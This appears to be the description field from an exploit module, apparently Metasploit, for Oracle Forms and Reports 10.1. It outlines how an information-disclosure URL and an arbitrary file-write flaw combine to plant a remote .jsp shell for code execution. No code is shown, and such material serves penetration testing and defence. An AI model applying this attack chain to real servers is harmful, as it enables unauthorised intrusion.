  DESCRIPTION => "

      This module uses two vulnerabilities in Oracle Forms and Reports to get remote code execution

      on the host. The showenv url can be used to disclose information about a server. A second

      vulnerability that allows arbitrary reading and writing to the host filesystem can then be

      used to write a shell from a remote url to a known local path disclosed from the previous

      vulnerability.



      The local path being accessible from an URL allows an attacker to perform the remote code

      execution using, for example, a .jsp shell.



      This module was tested successfully on Windows and Oracle Forms and Reports 10.1.
